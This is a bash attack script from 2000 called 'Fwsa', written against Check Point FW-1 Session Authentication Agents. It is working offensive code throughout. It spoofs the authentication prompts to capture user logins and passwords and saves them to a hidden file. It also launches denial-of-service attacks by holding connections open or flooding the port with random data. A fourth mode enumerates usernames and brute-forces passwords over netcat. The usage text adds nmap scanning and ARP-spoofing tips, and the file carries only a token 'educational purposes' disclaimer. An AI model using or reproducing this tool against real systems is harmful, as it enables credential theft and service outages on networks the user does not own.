#!/bin/bash
#
# Fwsa (FW-1 session auth), tested on linux 2.4.0 beta
# ( Swiss army knife for FW-1 Session authentication. )
#
# successfully tested against Session Authentication Agents 4.0 & 4.1
# and Firewall-1 module 4.0 
#
# please don't use it for any illegal activity but only for educational purposes
#
#         Gregory Duchemin   ( aka c3rb3r )
# 
#     for help or bug report <==> c3rb3r@hotmail.com

# 0ctober 2000

function Usage()
{
echo
echo " Usage: "$0" Targets_filez  type_of_attack [FQDN name] [dict file] [0/1/2/3]"
echo
echo "================proof of concept // Version 1.0 ==="
echo "==================================================="
echo
echo " Note: Targets_filez is a plaintext file with all IPs to check"
echo "       I recommend u to make it with the help of Nmap "
echo "       Try nmap -T Insane -sS -P0 -p 261 RANGE_IP to look for listening session agents." 
echo " Note: Type of attack is 1 for password recovery, 2 for stupid DOS, 3 for "
echo "       dangerous DOS and 4 for bruteforcing users password on Firewall"
echo
echo "       * password recovery will turn you back user FW1 login/password"
echo "       * stupid DOS just open a connexion and wait for nothing"
echo "         It'll block all other connexion and so, user access."
echo "       * dangerous DOS will enter an infinite loop within it send garbage."
echo "         Will crash some weak systems. ( find wich ones ;) ) "
echo "       * passwords Brute-force try to guess users password onto "
echo "         the corporate firewall. Have to supply an external address in filez"
echo "         to force firewall to connect on local port ( port 261 )."
echo
echo " Note: FQDN name is Fully Qualified Domain name, default:firewall used for FW-1 "
echo " banner."
echo " Note: Change the internal variables filez and logfile to store your stock into, default:\"...\""
echo " Note: this proggy needs netcat to nicely work."
echo 
echo " G00d Hunt !"
echo 
echo " author:  Gregory Duchemin  ( aka c3rb3r )"
echo "                          c3rb3r@hotmail.com "
echo 
echo " N0 c0pyright, feel free to use or modify it as u want"
echo
}

signal_handler()
{
sync
echo 
echo "Warning: target aborted, continuing with next one..."
echo
echo
}


filtered()
{
echo
echo "Error: target port 261 doesn't respond"
echo "       it should be because target is filtering or is down." 
echo "       Anyway, try again spoofing firewall address."
echo "       Arptool should be helpfull to do the job"
echo
}

closed()
{
echo
echo "Error: target port 261 is closed"
echo "       continuing with next ip." 
echo
echo
}

simple_dos()
{
for i in $ip; do 
echo
echo "***********************************************"
echo "Launching stupid DOS attack against "$i" !"
echo "***********************************************"
echo
echo
{
sleep $timeout 
sync
}| nc -n -w 2 -v $i 261 > $logfile 2>&1
if [ `awk '{ print $7 }' $logfile` = "refused" ]; then
closed
else
if [ `awk '{ print $7 }' $logfile` = "timed" ]; then
filtered
fi
fi
done
rm $logfile
echo
echo "DOS terminated. ( Hope it's ok)"
echo
}


dangerous_dos()
{
for i in $ip; do 
echo
echo "****************************************************"
echo "Launching dangerous DOS attack against "$i" !"
echo "****************************************************"
echo
echo
{
sleep $timeout 
cat /dev/random
}| nc -n -w 2 -v $i 261  > $logfile 2>&1
if [ $( awk '{ print $7 }' $logfile) = "refused" ]; then
closed
else 
if [ $(awk '{ print $7 }' $logfile) = "timed" ]; then
filtered
fi
fi
done
rm $logfile
echo
echo "DOS terminated. ( Hope it's ok)"
echo
}


password_recovery()
{
for i in $ip; do 
echo
echo "*****************************************************"
echo "Launching FW1 password recovery against "$i" !"
echo "*****************************************************"
echo
echo
{
sleep $timeout 
sync 
cat /dev/null > $logfile
echo "220 FW-1 Session Authentication Request from "$name
echo "211 253141732 1988 3931424644 80 5"
echo "331 User:"
sync
# synchronisation of buffers and disks  
while [ ! -s $logfile ]; do 
# waiting for user info supply in logfile 
sleep 1
done
user=$(cat $logfile)

echo "331 *Firewall-1 password:"

while [ `wc -l $logfile|awk '{ print $1 }'` -eq 1 ]; do
sleep 1
done
sed 's/'$user'//' $logfile | sed '/./,$!d' > ./tmp
password=$(cat ./tmp)
rm ./tmp
echo "200 User $user authenticated by Firewall-1 authentication."
echo "230 OK"
sleep 2
echo >> $filez
echo >> $filez
echo "===== Password recovery ============================================" >> $filez
echo "====================================================================" >> $filez
echo " Target <==> $i" >> $filez 
echo >> $filez 
echo " Username <==> $user    Password <==> $password" >> $filez
echo >> $filez 
echo >> $filez 
exit 0
}| nc  -n -w 2 -v $i 261  > $logfile
if [ -f ./tmp ]; then
rm tmp
fi
done
if [ -f $logfile ]; then
rm $logfile
fi
echo
echo "Done. ( see "$filez" to read stolen informations)"
echo
}



password_bruteforce()
{
for i in $ip; do 


echo
echo "*****************************************************"
echo "Launching FW1 password BruteForce attack "
echo "*****************************************************"
echo
echo


if [ -s $logfile ]; then
cat /dev/null > $logfile
fi

# We use as many char string as there are in password because
# most of the time, admin won't use a "real" random generator but 
# a program that use a basic scheme.
# if u understand this scheme and modify the string below, u should be able to increase significantly your chances of succeed.  
# if passwords in your company are less than 8 chars, comment useless lines 

# password scheme:
# for instance, first letter could be uppercase ( A or H string depending on order byte ).
# initial values are commented

#A='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'
A='A B C D E F G H I J K L M N O P Q R S T U V W X Y Z'

B='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'
C='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'
D='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'
E='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'
F='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'
G='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'
H='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'
{
# we send a probe to anywhere in the world port 80 (or whatever fw rules allow), waiting for FW answer 
nc -w 2 -n $i 80 > /dev/null 2>&1

# waiting for invitation caller  
grep 331 $logfile > /dev/null
while [ $? -eq 1 ]; 
do 
grep 331 $logfile > /dev/null
done

# we try now our login names until we get back the magic cookie
# actually we read login names in a file, it should be more efficient since most of admins use real names.
# u can use brute force to guess login in the same manner we use it for passwords.
# in this case, just change the few lines below to use chars strings from 1 up to 8 loops.

for user in $username
do
cat /dev/null > $logfile
sync
echo $user

# 530 eg NOTOK, error response
# fw1 session authentication reply with an error code if username doesn't exist, that's a flaw in itself.

sleep $timeout 

grep 530 $logfile > /dev/null
if [ $? -eq 1 ]; then
echo "===== Password Brute force ============================================" >> $filez
echo "====================================================================" >> $filez
echo >> $filez
echo >> $filez
echo " login ok :"$user >> $filez
echo >> $filez
echo >> $filez
echo $user >> ./.users
sync
continue
fi
done

if [ ! -f ./.users ]; then 
exit
fi

targets=`cat ./.users`
rm ./.users
 
# Now it's time  we try to guess password for this user
# if passwords in your company are less than 8 chars, comment useless loops.


for user in $targets
do
 
for i8 in $H 
do
for i7 in $G
do

# this rule is optional
if [ $i7 = $i8 ]; then
continue
fi

for i6 in $F
do

# this rule is optional
if [ $i6 = $i7 ]; then
continue
fi

for i5 in $E
do

# this rule is optional
if [ $i5 = $i6 ]; then
continue
fi

for i4 in $D 
do

# this rule is optional
if [ $i4 = $i5 ]; then
continue
fi

for i3 in $C
do

# this rule is optional
if [ $i3 = $i4 ]; then
continue
fi

for i2 in $B
do

# this rule is optional
if [ $i2 = $i3 ]; then
continue
fi

for i1 in $A
do

# this rule is optional
if [ $i1 = $i2 ]; then
continue
fi


# waiting for server

grep 331 $logfile > /dev/null
while [ $? -eq 1 ];
do 
grep 331 $logfile > /dev/null
done


# order is fetched by the user (see usage), and may be usefull for multi-process bruteforce.

if [ $order -eq 0 ]; then
echo $i1$i2$i3$i4$i5$i6$i7$i8
# for debugging purpose
echo "trying $i1$i2$i3$i4$i5$i6$i7$i8" >> $filez
else
if [ $order -eq 1 ]; then
echo $i1$i7$i6$i5$i4$i3$i2$i8
echo "trying $i1$i7$i6$i5$i4$i3$i2$i8" >> $filez
else
if [ $order -eq 2 ]; then
echo $i1$i5$i8$i2$i4$i7$i3$i6
echo "trying $i1$i5$i8$i2$i4$i7$i3$i6" >> $filez
else
echo $i1$i2$i4$i7$i8$i3$i6$i5
echo "trying $i1$i2$i4$i7$i8$i3$i6$i5" >> $filez
fi
fi
fi
sync 
usleep $utimeout 

# 230 eg OK, password is correct 

grep 230 $logfile > /dev/null
if [ $? -eq 0 ]; then
echo >> $filez
if [ $order -eq 0 ]; then
echo "password ok :"$i1$i2$i3$i4$i5$i6$i7$i8 >> $filez
else
if [ $order -eq 1 ]; then
echo "password ok :"$i8$i7$i6$i5$i4$i3$i2$i1 >> $filez
else
if [ $order -eq 2 ]; then
echo "password ok :"$i8$i5$i1$i2$i4$i7$i3$i6 >> $filez
else
echo "password ok :"$i2$i1$i4$i7$i8$i3$i6$i5 >> $filez
fi
fi
fi
echo >> $filez
echo >> $filez
exit
fi

# we r supposed to reinject username each time, this one we just discovered
# but connexion is still alive that's the major flaw.

grep 331 $logfile > /dev/null
while [ $? -eq 1 ];
do 
grep 331 $logfile > /dev/null
done

echo $user
done
done
done
done
done
done
done
done

done
}| nc  -n  -l -p 261  > $logfile 2>&1

#if [ -f $logfile ]; then
#rm $logfile
#fi
done
echo
echo "Done. ( see "$filez" to read stolen informations)"
echo
}



if [ $# -lt 2 ]; then
Usage
exit
fi

nc -h  > /dev/null 2>&1
if [ ! $? -eq 1 ]; then
Usage
echo
echo
echo "Error: "$0" needs netcat to properly run, please check u have it in your \$PATH or compile it now."
echo
exit
fi 

if [ ! $2 -eq 1 ] && [ ! $2 -eq 2 ] && [ ! $2 -eq 3 ] && [ ! $2 -eq 4 ]; then
Usage
echo
echo
echo "Error: Value for type of attack is out of range."
echo
exit
fi

if [ ! -s $1 ]; then
Usage
echo
echo
echo "Error: "$0" didn't find your Targets_ip filez."
echo
exit
fi

trap signal_handler SIGINT


ip=`cat $1`


# filez is where results are writen, please change it for your configuration
# don't forget to change this values for every instance of the process, u would like to launch
filez="./......"
logfile="./logfile4"

cat /dev/null > $filez

name="fwl01"

# timeout is connexion timer when waiting for a server response.

timeout=2


# utimeout is pretty important, specifically for brute force attack, lower value means faster loop but if too low, fw reply would be mistaken
# that depends of your network round trip time and average firewall cpu usage.
# try different values first: default 22 millisecond

utimeout=22000

if [ $# -gt 2 ]; then
name=$3
fi
if [ $# -gt 2 ] && [ $2 -eq 4 ]; then
if [ ! -s $3 ]; then
Usage
echo
echo "Error: "$0" didn't find your dict filez or it's empty."
echo
exit
fi
username=`cat $3`
fi

order=0
if [ $# -gt 3 ]; then
order=$4
fi

if [ -f $logfile ]; then
rm -f $logfile
fi

case "$2" in 
1)
   password_recovery
   ;;

2)
  simple_dos
  ;;

3)
  dangerous_dos
  ;;

4)
  password_bruteforce
  if [ -s $filez ]; then
  cat $filez
  fi
  ;;

*)
  exit 1
esac
exit






